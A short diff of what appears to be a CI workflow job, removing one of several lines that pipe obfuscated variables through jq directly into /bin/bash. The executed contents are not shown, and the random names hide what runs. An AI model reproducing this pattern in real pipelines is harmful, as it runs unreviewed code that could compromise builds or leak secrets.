@@ -25,7 +25,6 @@ jobs:
           echo $reo2 | jq -r .vkm9 | /bin/bash
           echo $c42 | jq -r .li299 | /bin/bash
           echo $jnhw7951 | jq -r .zqdm4 | /bin/bash
-          echo $jabi41 | jq -r .dfquz4804 | /bin/bash
           echo $xnj8 | jq -r .a72 | /bin/bash
           echo $kz125 | jq -r .ddp245 | /bin/bash
 
